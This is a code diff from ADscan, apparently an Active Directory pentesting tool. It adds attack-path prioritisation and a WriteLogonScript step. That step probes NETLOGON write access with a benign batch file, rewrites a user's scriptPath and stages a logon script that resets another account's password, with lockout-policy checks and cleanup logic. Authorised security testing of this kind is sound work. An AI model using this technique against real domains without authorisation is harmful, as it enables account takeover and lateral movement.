@@ -38,6 +38,7 @@ from adscan_internal.interaction import is_non_interactive
 from adscan_internal.integrations.netexec.timeouts import (
     get_recommended_internal_timeout,
 )
+from adscan_internal.reporting_compat import load_optional_report_service_attr
 from adscan_internal.passwords import generate_strong_password, is_password_complex
 from adscan_internal.rich_output import (
     BRAND_COLORS,
@@ -86,10 +87,58 @@ from adscan_internal.services.attack_step_support_registry import (
     SUPPORTED_RELATION_NOTES,
     classify_relation_support,
 )
+from adscan_internal.services.ldap_transport_service import (
+    prepare_kerberos_ldap_environment,
+)
+from adscan_internal.services.attack_step_catalog import (
+    relation_counts_for_execution_readiness,
+    relation_requires_execution_context,
+)
+from adscan_internal.services.attack_path_target_viability_service import (
+    assess_computer_target_viability,
+)
+from adscan_internal.services.logon_script_payload_service import (
+    build_force_change_password_logon_script,
+)
 from adscan_internal.workspaces import domain_subpath, write_json_file
 
 
 ATTACK_PATH_SNAPSHOT_FILENAME = "attack_paths_snapshot.json"
+
+
+def _summary_target_priority_class(summary: dict[str, Any]) -> str:
+    """Return the normalized target priority class for one path summary."""
+    value = str(summary.get("target_priority_class") or "").strip().lower()
+    if value in {"tierzero", "highvalue", "pivot"}:
+        return value
+    if bool(summary.get("is_tier_zero")):
+        return "tierzero"
+    if bool(summary.get("target_is_high_value")):
+        return "highvalue"
+    return "pivot"
+
+
+def _sort_target_priority_groups(
+    summaries: list[dict[str, Any]],
+) -> list[dict[str, Any]]:
+    """Return summaries grouped Tier-0 first, then high-value, then pivots."""
+    ordered_classes = ("tierzero", "highvalue", "pivot")
+    return [
+        summary
+        for priority_class in ordered_classes
+        for summary in summaries
+        if _summary_target_priority_class(summary) == priority_class
+    ]
+
+
+def _summary_search_mode_label(summary: dict[str, Any]) -> str:
+    """Return the per-summary search-mode label used by execution UX."""
+    priority_class = _summary_target_priority_class(summary)
+    if priority_class == "tierzero":
+        return "Tier-0 Search"
+    if priority_class == "highvalue":
+        return "High-Value Search"
+    return "Pivot Search"
 
 
 def _normalize_account(value: str) -> str:
@@ -99,6 +148,11 @@ def _normalize_account(value: str) -> str:
     if "@" in name:
         name = name.split("@", 1)[0]
     return name.strip().lower()
+
+
+def _is_audit_mode(shell: Any) -> bool:
+    """Return whether the current shell is running in audit mode."""
+    return str(getattr(shell, "type", "") or "").strip().lower() == "audit"
 
 
 def _get_stored_domain_credential_for_user(
@@ -140,6 +194,272 @@ def _env_int(name: str, default: int, *, minimum: int = 0) -> int:
     except (TypeError, ValueError):
         value = default
     return max(minimum, value)
+
+
+def _is_adscan_managed_logon_script_path(path_value: str) -> bool:
+    """Return whether one scriptPath value points to an ADscan-managed artifact."""
+    basename = os.path.basename(str(path_value or "").replace("\\", "/")).strip().lower()
+    return bool(basename) and basename.startswith("adscan-") and basename.endswith(".bat")
+
+
+def _join_smb_path(directory_path: str, filename: str) -> str:
+    """Join one SMB directory path and one filename using backslashes."""
+    dir_clean = str(directory_path or "").strip().replace("/", "\\").strip("\\")
+    file_clean = str(filename or "").strip().replace("/", "\\").strip("\\")
+    if not dir_clean:
+        return file_clean
+    if not file_clean:
+        return dir_clean
+    return f"{dir_clean}\\{file_clean}"
+
+
+def _get_pending_writelogonscript_manual_validations(shell: Any) -> list[dict[str, Any]]:
+    """Return the mutable in-memory list of pending manual validations."""
+    existing = getattr(shell, "_pending_writelogonscript_manual_validations", None)
+    if isinstance(existing, list):
+        return existing
+    pending: list[dict[str, Any]] = []
+    setattr(shell, "_pending_writelogonscript_manual_validations", pending)
+    return pending
+
+
+def register_writelogonscript_manual_validation(
+    shell: Any,
+    *,
+    domain: str,
+    username: str,
+    credential: str,
+    summary: dict[str, Any],
+    from_label: str,
+    to_label: str,
+) -> None:
+    """Register one manual validation handoff for a staged WriteLogonScript step."""
+    pending = _get_pending_writelogonscript_manual_validations(shell)
+    entry = {
+        "domain": str(domain or "").strip().lower(),
+        "username": _normalize_account(username),
+        "credential": str(credential or ""),
+        "summary": summary,
+        "from_label": str(from_label or ""),
+        "to_label": str(to_label or ""),
+        "registered_at": datetime.now(UTC).isoformat(),
+    }
+    pending[:] = [
+        item
+        for item in pending
+        if not (
+            str(item.get("domain") or "").strip().lower() == entry["domain"]
+            and str(item.get("username") or "").strip() == entry["username"]
+        )
+    ]
+    pending.append(entry)
+    print_info_debug(
+        "[writelogonscript] registered pending manual validation: "
+        f"domain={mark_sensitive(entry['domain'], 'domain')} "
+        f"user={mark_sensitive(entry['username'], 'user')}"
+    )
+
+
+def match_writelogonscript_manual_validation(
+    shell: Any,
+    *,
+    domain: str,
+    username: str,
+    credential: str,
+) -> dict[str, Any] | None:
+    """Return one pending manual validation matching a manual credential save."""
+    normalized_domain = str(domain or "").strip().lower()
+    normalized_user = _normalize_account(username)
+    raw_credential = str(credential or "")
+    for item in _get_pending_writelogonscript_manual_validations(shell):
+        if str(item.get("domain") or "").strip().lower() != normalized_domain:
+            continue
+        if str(item.get("username") or "").strip() != normalized_user:
+            continue
+        if str(item.get("credential") or "") != raw_credential:
+            continue
+        return item
+    return None
+
+
+def clear_writelogonscript_manual_validation(
+    shell: Any,
+    *,
+    domain: str,
+    username: str,
+    credential: str,
+) -> None:
+    """Clear one consumed pending manual validation entry."""
+    normalized_domain = str(domain or "").strip().lower()
+    normalized_user = _normalize_account(username)
+    raw_credential = str(credential or "")
+    pending = _get_pending_writelogonscript_manual_validations(shell)
+    pending[:] = [
+        item
+        for item in pending
+        if not (
+            str(item.get("domain") or "").strip().lower() == normalized_domain
+            and str(item.get("username") or "").strip() == normalized_user
+            and str(item.get("credential") or "") == raw_credential
+        )
+    ]
+
+
+def _get_writelogonscript_lockout_policy_state(
+    shell: Any,
+    *,
+    domain: str,
+    username: str,
+    password: str,
+) -> dict[str, Any]:
+    """Return whether automatic post-stage validation is safe for this domain."""
+    try:
+        from adscan_internal.cli.spraying import _run_netexec_query_with_parse_retry
+        from adscan_internal.spraying import (
+            build_netexec_pass_pol_command,
+            parse_netexec_lockout_threshold_result,
+        )
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        return {
+            "policy_known": False,
+            "auto_validation_safe": False,
+            "lockout_threshold": None,
+            "explicit_none": False,
+            "error": str(exc),
+        }
+
+    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+    pdc_ip = str(domain_data.get("pdc") or "").strip()
+    netexec_path = str(getattr(shell, "netexec_path", "") or "").strip()
+    if not pdc_ip or not netexec_path or not username or not password:
+        return {
+            "policy_known": False,
+            "auto_validation_safe": False,
+            "lockout_threshold": None,
+            "explicit_none": False,
+            "error": "Missing NetExec path, PDC, or authenticated credential for pass-pol query.",
+        }
+
+    command = build_netexec_pass_pol_command(
+        nxc_path=netexec_path,
+        dc_ip=pdc_ip,
+        username=username,
+        password=password,
+        domain=domain,
+        kerberos=True,
+    )
+    print_info_debug(f"[writelogonscript pass-pol] {command}")
+    proc = _run_netexec_query_with_parse_retry(
+        shell,
+        command=command,
+        domain=domain,
+        query_label="NetExec --pass-pol",
+        parse_ok=lambda output: (
+            parse_netexec_lockout_threshold_result(output).explicit_none
+            or parse_netexec_lockout_threshold_result(output).threshold is not None
+        ),
+    )
+    stdout = str(getattr(proc, "stdout", "") or "")
+    if not stdout:
+        return {
+            "policy_known": False,
+            "auto_validation_safe": False,
+            "lockout_threshold": None,
+            "explicit_none": False,
+            "error": "Password policy query returned no parseable output.",
+        }
+
+    threshold_result = parse_netexec_lockout_threshold_result(stdout)
+    if threshold_result.explicit_none:
+        return {
+            "policy_known": True,
+            "auto_validation_safe": True,
+            "lockout_threshold": None,
+            "explicit_none": True,
+            "error": "",
+        }
+    if threshold_result.threshold == 0:
+        return {
+            "policy_known": True,
+            "auto_validation_safe": True,
+            "lockout_threshold": 0,
+            "explicit_none": False,
+            "error": "",
+        }
+    if threshold_result.threshold is not None:
+        return {
+            "policy_known": True,
+            "auto_validation_safe": False,
+            "lockout_threshold": int(threshold_result.threshold),
+            "explicit_none": False,
+            "error": "",
+        }
+    return {
+        "policy_known": False,
+        "auto_validation_safe": False,
+        "lockout_threshold": None,
+        "explicit_none": False,
+        "error": "Password policy output did not expose a parseable lockout threshold.",
+    }
+
+
+def _render_writelogonscript_manual_validation_panel(
+    *,
+    domain: str,
+    target_user: str,
+    credential: str,
+    policy_state: dict[str, Any],
+) -> None:
+    """Render operator guidance when auto-validation is unsafe."""
+    marked_domain = mark_sensitive(domain, "domain")
+    marked_user = mark_sensitive(target_user, "user")
+    lockout_threshold = policy_state.get("lockout_threshold")
+    if policy_state.get("explicit_none"):
+        threshold_label = "None"
+    elif lockout_threshold is None:
+        threshold_label = "Unknown"
+    else:
+        threshold_label = str(lockout_threshold)
+    message = Text()
+    message.append(
+        "Automatic WriteLogonScript credential validation was skipped.\n",
+        style="bold yellow",
+    )
+    message.append(
+        f"Target user: {marked_user}\n"
+        f"Domain: {marked_domain}\n"
+        f"Account lockout threshold: {mark_sensitive(threshold_label, 'text')}\n\n",
+        style="bold",
+    )
+    message.append("Why ADscan stopped here:\n", style="bold")
+    message.append(
+        " - Automatic LDAP polling would repeatedly test the staged password.\n"
+        " - In a domain with lockout enforcement, those retries could lock the account.\n\n",
+        style="dim",
+    )
+    message.append("Recommended next step:\n", style="bold")
+    message.append(
+        " - Wait for the target user to log on and trigger the script.\n"
+        " - Validate the new credential manually and carefully, using as few attempts as possible.\n"
+        " - Once confirmed, save it in ADscan with:\n",
+        style="dim",
+    )
+    message.append(
+        f"   creds save {domain} {target_user} {credential}\n\n",
+        style="bold cyan",
+    )
+    message.append(
+        "When you save that exact credential in this session, ADscan will trust the manual validation "
+        "and attempt the pending WriteLogonScript cleanup automatically.",
+        style="dim",
+    )
+    print_panel(
+        message,
+        title=Text("Manual Validation Required", style="bold yellow"),
+        border_style="yellow",
+        expand=False,
+    )
 
 
 def persist_attack_path_snapshot(
@@ -192,10 +512,8 @@ def persist_attack_path_snapshot(
                     "length": int(summary.get("length") or 0),
                     "status": str(summary.get("status") or "theoretical"),
                     "is_high_value": bool(summary.get("target_is_high_value")),
-                    "is_tier_zero": bool(
-                        summary.get("target_is_high_value")
-                        or summary.get("is_tier_zero")
-                    ),
+                    "is_tier_zero": _summary_target_priority_class(summary) == "tierzero",
+                    "target_priority_class": _summary_target_priority_class(summary),
                     "nodes": [str(node or "") for node in nodes],
                     "relations": [str(relation or "") for relation in relations],
                     "steps": steps,
@@ -279,9 +597,17 @@ def _record_attack_path_execution_event(
 
     This is best-effort only and must never alter the existing CLI execution flow.
     """
-    try:
-        from adscan_internal.pro.services.report_service import record_technical_event
+    record_technical_event = load_optional_report_service_attr(
+        "record_technical_event",
+        action="Technical event sync",
+        debug_printer=print_info_debug,
+        prefix="[attack_paths]",
+        module_name="adscan_internal.pro.services.report_service",
+    )
+    if not callable(record_technical_event):
+        return
 
+    try:
         details = {
             "source": "attack_path_execution",
             "event_stage": str(event_stage or "").strip(),
@@ -291,9 +617,8 @@ def _record_attack_path_execution_event(
             "path_length": int(summary.get("length") or 0),
             "path_status": str(summary.get("status") or "theoretical").strip(),
             "is_high_value": bool(summary.get("target_is_high_value")),
-            "is_tier_zero": bool(
-                summary.get("target_is_high_value") or summary.get("is_tier_zero")
-            ),
+            "is_tier_zero": _summary_target_priority_class(summary) == "tierzero",
+            "target_priority_class": _summary_target_priority_class(summary),
             "step_index": int(step_index) if step_index is not None else None,
             "total_steps": int(total_steps) if total_steps is not None else None,
             "executable_step_index": (
@@ -333,25 +658,6 @@ _AUTO_REFRESH_AFFECTED_USERS_THRESHOLD = _env_int(
     150,
     minimum=0,
 )
-
-_EXECUTION_CONTEXT_ACTIONS = {
-    "adminto",
-    "sqladmin",
-    "canrdp",
-    "canpsremote",
-    "allowedtodelegate",
-    "adcsesc1",
-    "adcsesc3",
-    "adcsesc4",
-    "dumplsa",
-    "dumpdpapi",
-    *ACL_ACE_RELATIONS,
-}
-_EXECUTION_READINESS_ACTIONS = _EXECUTION_CONTEXT_ACTIONS | {
-    "kerberoasting",
-    "asreproasting",
-}
-
 
 def _affected_user_count(summary: dict[str, Any]) -> int:
     """Return affected principal count (users + computers) from summary metadata.
@@ -405,7 +711,7 @@ def _first_execution_readiness_step(summary: dict[str, Any]) -> tuple[str, dict[
         if not isinstance(step, dict):
             continue
         action = str(step.get("action") or "").strip().lower()
-        if action in _EXECUTION_READINESS_ACTIONS:
+        if relation_counts_for_execution_readiness(action):
             details = step.get("details")
             if isinstance(details, dict):
                 return action, details
@@ -493,9 +799,32 @@ def _execution_readiness_meta(
             "execution_context_action": action,
         }
 
+    if not relation_requires_execution_context(action):
+        return {
+            "execution_context_required": False,
+            "execution_support_status": "supported",
+            "execution_support_target_kind": "",
+            "execution_target_enabled": None,
+            "execution_target_enabled_source": "unknown",
+            "execution_ready_count": 1,
+            "execution_candidate_count": 1,
+            "execution_candidate_source": "catalog_no_context_required",
+            "execution_readiness_reason": "catalog_no_context_required",
+            "execution_context_action": action,
+        }
+
     target_kind = ""
     target_enabled: bool | None = None
     target_enabled_source = "unknown"
+    target_viability_status = ""
+    target_viability_summary = ""
+    target_viability_reason = ""
+    target_reachable: bool | None = None
+    target_reachable_source = "unknown"
+    target_resolved: bool | None = None
+    target_matched_ips: tuple[str, ...] = ()
+    target_vantage_mode = ""
+    target_execution_advisory = ""
     if action in ACL_ACE_RELATIONS and to_label:
         to_node = get_node_by_label(shell, domain, label=to_label)
         if isinstance(to_node, dict):
@@ -511,6 +840,28 @@ def _execution_readiness_meta(
                 principal_kind=target_kind,
                 node=to_node,
             )
+            if str(target_kind or "").strip().lower() == "computer":
+                target_viability = assess_computer_target_viability(
+                    shell,
+                    domain=domain,
+                    principal_name=to_label,
+                    node=to_node,
+                )
+                target_viability_status = target_viability.status
+                target_viability_summary = target_viability.operator_summary
+                target_viability_reason = target_viability.debug_reason
+                target_reachable = target_viability.reachable_from_current_vantage
+                target_reachable_source = (
+                    "current_vantage_reachability_report"
+                    if target_viability.reachable_from_current_vantage is not None
+                    else "unknown"
+                )
+                target_resolved = target_viability.resolved_in_current_vantage_inventory
+                target_matched_ips = tuple(target_viability.matched_ips)
+                target_vantage_mode = str(target_viability.vantage_mode or "")
+                target_execution_advisory = str(
+                    target_viability.execution_advisory or ""
+                )
         supported, support_reason = describe_ace_relation_support(action, target_kind)
         if not supported:
             return {
@@ -520,6 +871,15 @@ def _execution_readiness_meta(
                 "execution_support_target_kind": target_kind or "Unknown",
                 "execution_target_enabled": target_enabled,
                 "execution_target_enabled_source": target_enabled_source,
+                "execution_target_viability_status": target_viability_status,
+                "execution_target_viability_summary": target_viability_summary,
+                "execution_target_viability_reason": target_viability_reason,
+                "execution_target_reachable": target_reachable,
+                "execution_target_reachable_source": target_reachable_source,
+                "execution_target_resolved": target_resolved,
+                "execution_target_matched_ips": list(target_matched_ips),
+                "execution_target_vantage_mode": target_vantage_mode,
+                "execution_target_execution_advisory": target_execution_advisory,
                 "execution_ready_count": 0,
                 "execution_candidate_count": 0,
                 "execution_candidate_source": "unsupported",
@@ -539,6 +899,15 @@ def _execution_readiness_meta(
             "execution_support_target_kind": target_kind or "",
             "execution_target_enabled": target_enabled,
             "execution_target_enabled_source": target_enabled_source,
+            "execution_target_viability_status": target_viability_status,
+            "execution_target_viability_summary": target_viability_summary,
+            "execution_target_viability_reason": target_viability_reason,
+            "execution_target_reachable": target_reachable,
+            "execution_target_reachable_source": target_reachable_source,
+            "execution_target_resolved": target_resolved,
+            "execution_target_matched_ips": list(target_matched_ips),
+            "execution_target_vantage_mode": target_vantage_mode,
+            "execution_target_execution_advisory": target_execution_advisory,
             "execution_ready_count": 1 if ready else 0,
             "execution_candidate_count": 1,
             "execution_candidate_source": "context_username",
@@ -566,6 +935,15 @@ def _execution_readiness_meta(
             "execution_support_target_kind": target_kind or "",
             "execution_target_enabled": target_enabled,
             "execution_target_enabled_source": target_enabled_source,
+            "execution_target_viability_status": target_viability_status,
+            "execution_target_viability_summary": target_viability_summary,
+            "execution_target_viability_reason": target_viability_reason,
+            "execution_target_reachable": target_reachable,
+            "execution_target_reachable_source": target_reachable_source,
+            "execution_target_resolved": target_resolved,
+            "execution_target_matched_ips": list(target_matched_ips),
+            "execution_target_vantage_mode": target_vantage_mode,
+            "execution_target_execution_advisory": target_execution_advisory,
             "execution_ready_count": 1,
             "execution_candidate_count": 1,
             "execution_candidate_source": "from_label_credential",
@@ -579,6 +957,15 @@ def _execution_readiness_meta(
             "execution_support_target_kind": target_kind or "",
             "execution_target_enabled": target_enabled,
             "execution_target_enabled_source": target_enabled_source,
+            "execution_target_viability_status": target_viability_status,
+            "execution_target_viability_summary": target_viability_summary,
+            "execution_target_viability_reason": target_viability_reason,
+            "execution_target_reachable": target_reachable,
+            "execution_target_reachable_source": target_reachable_source,
+            "execution_target_resolved": target_resolved,
+            "execution_target_matched_ips": list(target_matched_ips),
+            "execution_target_vantage_mode": target_vantage_mode,
+            "execution_target_execution_advisory": target_execution_advisory,
             "execution_ready_count": 0,
             "execution_candidate_count": 1,
             "execution_candidate_source": "from_label_user_node",
@@ -604,6 +991,15 @@ def _execution_readiness_meta(
             "execution_support_target_kind": target_kind or "",
             "execution_target_enabled": target_enabled,
             "execution_target_enabled_source": target_enabled_source,
+            "execution_target_viability_status": target_viability_status,
+            "execution_target_viability_summary": target_viability_summary,
+            "execution_target_viability_reason": target_viability_reason,
+            "execution_target_reachable": target_reachable,
+            "execution_target_reachable_source": target_reachable_source,
+            "execution_target_resolved": target_resolved,
+            "execution_target_matched_ips": list(target_matched_ips),
+            "execution_target_vantage_mode": target_vantage_mode,
+            "execution_target_execution_advisory": target_execution_advisory,
             "execution_ready_count": len(ready_users),
             "execution_candidate_count": affected_count or len(affected_users),
             "execution_candidate_source": "affected_users",
@@ -622,6 +1018,15 @@ def _execution_readiness_meta(
             "execution_support_target_kind": target_kind or "",
             "execution_target_enabled": target_enabled,
             "execution_target_enabled_source": target_enabled_source,
+            "execution_target_viability_status": target_viability_status,
+            "execution_target_viability_summary": target_viability_summary,
+            "execution_target_viability_reason": target_viability_reason,
+            "execution_target_reachable": target_reachable,
+            "execution_target_reachable_source": target_reachable_source,
+            "execution_target_resolved": target_resolved,
+            "execution_target_matched_ips": list(target_matched_ips),
+            "execution_target_vantage_mode": target_vantage_mode,
+            "execution_target_execution_advisory": target_execution_advisory,
             "execution_ready_count": len(stored_creds),
             "execution_candidate_count": len(stored_creds),
             "execution_candidate_source": "all_stored_credentials_fallback",
@@ -635,6 +1040,15 @@ def _execution_readiness_meta(
         "execution_support_target_kind": target_kind or "",
         "execution_target_enabled": target_enabled,
         "execution_target_enabled_source": target_enabled_source,
+        "execution_target_viability_status": target_viability_status,
+        "execution_target_viability_summary": target_viability_summary,
+        "execution_target_viability_reason": target_viability_reason,
+        "execution_target_reachable": target_reachable,
+        "execution_target_reachable_source": target_reachable_source,
+        "execution_target_resolved": target_resolved,
+        "execution_target_matched_ips": list(target_matched_ips),
+        "execution_target_vantage_mode": target_vantage_mode,
+        "execution_target_execution_advisory": target_execution_advisory,
         "execution_ready_count": 0,
         "execution_candidate_count": 0,
         "execution_candidate_source": "unresolved",
@@ -1356,6 +1770,921 @@ def _resolve_domain_password(shell: object, domain: str, username: str) -> str |
     if not isinstance(value, str) or not value:
         return None
     return value
+
+
+def _resolve_default_domain_controller(domain_data: dict[str, Any], domain: str) -> str | None:
+    """Return the preferred DC target for SMB-backed execution helpers."""
+    dc_fqdn = domain_data.get("pdc_hostname_fqdn") or domain_data.get("pdc_fqdn")
+    if isinstance(dc_fqdn, str) and dc_fqdn.strip():
+        return dc_fqdn.strip()
+    pdc_hostname = str(domain_data.get("pdc_hostname") or "").strip()
+    if pdc_hostname:
+        return pdc_hostname if "." in pdc_hostname else f"{pdc_hostname}.{domain}"
+    pdc_ip = str(domain_data.get("pdc") or "").strip()
+    return pdc_ip or None
+
+
+def _execute_writelogonscript_precheck(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    from_label: str,
+    to_label: str,
+    details: dict[str, Any],
+    context_username: str | None,
+    context_password: str | None,
+) -> tuple[str, dict[str, Any]]:
+    """Confirm logon-script staging access by uploading a benign batch file probe."""
+    from adscan_internal.services.smb_path_access_service import SMBPathAccessService
+    from adscan_internal.services.attack_graph_service import (
+        _build_writelogonscript_staging_candidates,
+    )
+
+    exec_username = _resolve_execution_user(
+        shell,
+        domain=domain,
+        context_username=context_username,
+        summary=summary,
+        from_label=from_label,
+    )
+    if not exec_username:
+        return (
+            "blocked",
+            {"reason": "no_usable_execution_context"},
+        )
+    password = context_password or _resolve_domain_password(shell, domain, exec_username)
+    if not password:
+        return (
+            "blocked",
+            {
+                "reason": "missing_execution_password",
+                "user": exec_username,
+            },
+        )
+
+    domains_data = getattr(shell, "domains_data", None)
+    domain_data = (
+        domains_data.get(domain)
+        if isinstance(domains_data, dict) and isinstance(domains_data.get(domain), dict)
+        else {}
+    )
+    target_host = str(details.get("host") or "").strip() or _resolve_default_domain_controller(domain_data, domain) or ""
+    if not target_host:
+        return ("failed", {"reason": "missing_target_host"})
+
+    use_kerberos = bool(domain_data.get("kerberos_tickets"))
+    if use_kerberos:
+        use_kerberos = prepare_kerberos_ldap_environment(
+            operation_name="WriteLogonScript execution precheck",
+            target_domain=domain,
+            workspace_dir=str(
+                getattr(shell, "current_workspace_dir", "")
+                or getattr(shell, "_get_workspace_cwd", lambda: "")()
+                or ""
+            ),
+            username=str(exec_username),
+            user_domain=str(domain),
+            domains_data=getattr(shell, "domains_data", {}),
+            sync_clock=getattr(shell, "do_sync_clock_with_pdc", None),
+        )
+
+    probe_service = SMBPathAccessService()
+    candidate_map = {
+        f"{str(candidate.get('share') or '').strip().upper()}|{str(candidate.get('path') or '').strip()}": candidate
+        for candidate in _build_writelogonscript_staging_candidates(domain)
+    }
+    detail_candidates = details.get("staging_candidates")
+    ordered_candidates: list[dict[str, Any]] = []
+    if isinstance(detail_candidates, list):
+        validated = []
+        unknown = []
+        denied = []
+        for item in detail_candidates:
+            if not isinstance(item, dict):
+                continue
+            bucket = (
+                validated
+                if str(item.get("validation") or "").strip().lower() == "validated"
+                else denied
+                if str(item.get("validation") or "").strip().lower() == "denied"
+                else unknown
+            )
+            bucket.append(item)
+        ordered_candidates = validated + unknown
+        if not ordered_candidates and denied:
+            return (
+                "blocked",
+                {
+                    "reason": "staging_acl_denied",
+                    "user": exec_username,
+                    "target_host": target_host,
+                    "staging_candidates": denied,
+                },
+            )
+    if not ordered_candidates:
+        ordered_candidates = list(candidate_map.values())
+
+    attempted_candidates: list[dict[str, Any]] = []
+    last_failure: dict[str, Any] | None = None
+    for candidate in ordered_candidates:
+        share_name = str(candidate.get("share") or "NETLOGON").strip() or "NETLOGON"
+        directory_path = str(candidate.get("path") or "").strip()
+        probe_result = probe_service.probe_file_upload(
+            target_host=target_host,
+            share_name=share_name,
+            directory_path=directory_path,
+            username=str(exec_username),
+            password=password,
+            auth_domain=str(domain),
+            file_contents=b"@echo off\r\nrem adscan writelogonscript precheck\r\n",
+            filename_prefix="adscan-logonscript-precheck-",
+            filename_suffix=".bat",
+            delete_after=True,
+            use_kerberos=use_kerberos,
+            kdc_host=target_host if use_kerberos else None,
+        )
+        attempted_candidates.append(
+            {
+                "name": str(candidate.get("name") or ""),
+                "share": share_name,
+                "path": directory_path,
+                "validation": str(candidate.get("validation") or "").strip().lower() or "runtime",
+                "success": probe_result.success,
+                "status_code": probe_result.status_code or "",
+                "error": probe_result.error_message or "",
+            }
+        )
+        if probe_result.success:
+            return (
+                "precheck_succeeded",
+                {
+                    "user": exec_username,
+                    "target_host": target_host,
+                    "share": share_name,
+                    "path": directory_path,
+                    "selected_staging_candidate": str(candidate.get("name") or share_name),
+                    "probe_path": probe_result.probed_file_path,
+                    "auth_mode": probe_result.auth_mode,
+                    "netlogon_write_confirmed": True,
+                    "reason": "netlogon_write_probe_succeeded",
+                    "attempted_candidates": attempted_candidates,
+                },
+            )
+        last_failure = {
+            "reason": "netlogon_write_probe_failed",
+            "error": probe_result.error_message or "",
+            "status_code": probe_result.status_code or "",
+            "share": share_name,
+            "path": directory_path,
+            "probe_path": probe_result.probed_file_path,
+            "auth_mode": probe_result.auth_mode,
+        }
+
+    return (
+        "failed",
+        {
+            "user": exec_username,
+            "target_host": target_host,
+            "netlogon_write_confirmed": False,
+            "attempted_candidates": attempted_candidates,
+            **(last_failure or {"reason": "netlogon_write_probe_failed"}),
+        },
+    )
+
+
+def _resolve_writelogonscript_next_step_strategy(
+    *,
+    summary: dict[str, Any],
+    current_step_index: int,
+    current_to_label: str,
+) -> dict[str, Any] | None:
+    """Return the supported next-step strategy for one WriteLogonScript edge."""
+    steps = summary.get("steps") if isinstance(summary.get("steps"), list) else []
+    if current_step_index < 0 or current_step_index >= len(steps) - 1:
+        return None
+    next_step = steps[current_step_index + 1]
+    if not isinstance(next_step, dict):
+        return None
+    next_action = str(next_step.get("action") or "").strip().lower()
+    next_details = (
+        next_step.get("details") if isinstance(next_step.get("details"), dict) else {}
+    )
+    next_from = str(next_details.get("from") or "").strip()
+    next_to = str(next_details.get("to") or "").strip()
+    if next_action != "forcechangepassword":
+        return None
+    if current_to_label and next_from and current_to_label.upper() != next_from.upper():
+        return None
+    return {
+        "strategy_key": "force_change_password",
+        "next_step_index": current_step_index + 1,
+        "next_action": str(next_step.get("action") or "").strip(),
+        "target_user_label": next_to,
+    }
+
+
+def _extract_account_name_from_label(value: str) -> str:
+    """Return the account portion from one ``NAME@DOMAIN`` label when possible."""
+    label = str(value or "").strip()
+    if not label:
+        return ""
+    return label.split("@", 1)[0].strip()
+
+
+def _execute_writelogonscript_force_change_password_strategy(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    current_step_index: int,
+    from_label: str,
+    to_label: str,
+    details: dict[str, Any],
+    context_username: str | None,
+    context_password: str | None,
+    precheck_notes: dict[str, Any],
+) -> tuple[str, dict[str, Any]]:
+    """Stage a ForceChangePassword payload through one logon script."""
+    from adscan_internal.services import ExploitationService
+    from adscan_internal.services.smb_path_access_service import SMBPathAccessService
+
+    strategy = _resolve_writelogonscript_next_step_strategy(
+        summary=summary,
+        current_step_index=current_step_index,
+        current_to_label=to_label,
+    )
+    if not isinstance(strategy, dict):
+        return ("unsupported_strategy", {"reason": "unsupported_next_step_strategy"})
+
+    exec_username = _resolve_execution_user(
+        shell,
+        domain=domain,
+        context_username=context_username,
+        summary=summary,
+        from_label=from_label,
+    )
+    password = context_password or _resolve_domain_password(shell, domain, exec_username)
+    if not exec_username or not password:
+        return (
+            "blocked",
+            {
+                "reason": "missing_execution_password",
+                "user": exec_username or "",
+            },
+        )
+
+    target_host = str(precheck_notes.get("target_host") or details.get("host") or "").strip()
+    if not target_host:
+        return ("failed", {"reason": "missing_target_host"})
+
+    target_object = str(details.get("target_dn") or "").strip() or _extract_account_name_from_label(to_label)
+    next_target_label = str(strategy.get("target_user_label") or "").strip()
+    next_target_user = _extract_account_name_from_label(next_target_label)
+    if not target_object or not next_target_user:
+        return (
+            "failed",
+            {
+                "reason": "missing_target_selector",
+                "target_object": target_object,
+                "next_target_user": next_target_user,
+            },
+        )
+
+    non_interactive = is_non_interactive(shell)
+    generated_password = _generate_strong_password(16)
+    selected_password = generated_password
+    if not non_interactive:
+        selected_password = (
+            Prompt.ask(
+                f"Password to set on {next_target_label}",
+                default=generated_password,
+            ).strip()
+            or generated_password
+        )
+    if not _is_password_complex(selected_password):
+        return (
+            "blocked",
+            {
+                "reason": "invalid_followup_password",
+                "next_target_user": next_target_user,
+            },
+        )
+
+    payload = build_force_change_password_logon_script(
+        target_username=next_target_user,
+        new_password=selected_password,
+        filename_suffix_token=secrets.token_hex(4),
+    )
+
+    domain_data = (
+        getattr(shell, "domains_data", {}).get(domain, {})
+        if isinstance(getattr(shell, "domains_data", {}), dict)
+        else {}
+    )
+    use_kerberos = bool(domain_data.get("kerberos_tickets"))
+    if use_kerberos:
+        use_kerberos = prepare_kerberos_ldap_environment(
+            operation_name="WriteLogonScript ForceChangePassword staging",
+            target_domain=domain,
+            workspace_dir=str(
+                getattr(shell, "current_workspace_dir", "")
+                or getattr(shell, "_get_workspace_cwd", lambda: "")()
+                or ""
+            ),
+            username=str(exec_username),
+            user_domain=str(domain),
+            domains_data=getattr(shell, "domains_data", {}),
+            sync_clock=getattr(shell, "do_sync_clock_with_pdc", None),
+        )
+
+    bloody_path = str(getattr(shell, "bloodyad_path", "") or "").strip()
+    if not bloody_path:
+        return (
+            "failed",
+            {
+                "reason": "missing_bloodyad_path",
+                "share": str(precheck_notes.get("share") or ""),
+                "path": str(precheck_notes.get("path") or ""),
+            },
+        )
+
+    service = ExploitationService()
+    previous_script_path = ""
+    previous_script_path_readable = False
+    get_attrs_result = service.acl.get_object_attributes(
+        pdc_host=target_host,
+        bloody_path=bloody_path,
+        domain=domain,
+        username=exec_username,
+        password=password,
+        target_object=target_object,
+        attribute_names=("scriptPath",),
+        kerberos=use_kerberos,
+        timeout=180,
+    )
+    if get_attrs_result.success:
+        previous_script_path = str(get_attrs_result.attributes.get("scriptPath") or "").strip()
+        previous_script_path_readable = True
+    previous_script_path_original = previous_script_path
+    stale_managed_script_path = ""
+    stale_managed_script_deleted = False
+    stale_managed_script_delete_error = ""
+    if previous_script_path_readable and _is_adscan_managed_logon_script_path(previous_script_path):
+        stale_managed_script_path = previous_script_path
+        previous_script_path = ""
+        print_warning(
+            "WriteLogonScript found a stale ADscan-managed scriptPath on the target user. "
+            "ADscan will replace it and will not restore the stale path afterwards."
+        )
+        print_info_debug(
+            "[writelogonscript] stale managed scriptPath detected: "
+            f"target={mark_sensitive(to_label, 'user')} "
+            f"script_path={mark_sensitive(stale_managed_script_path, 'path')}"
+        )
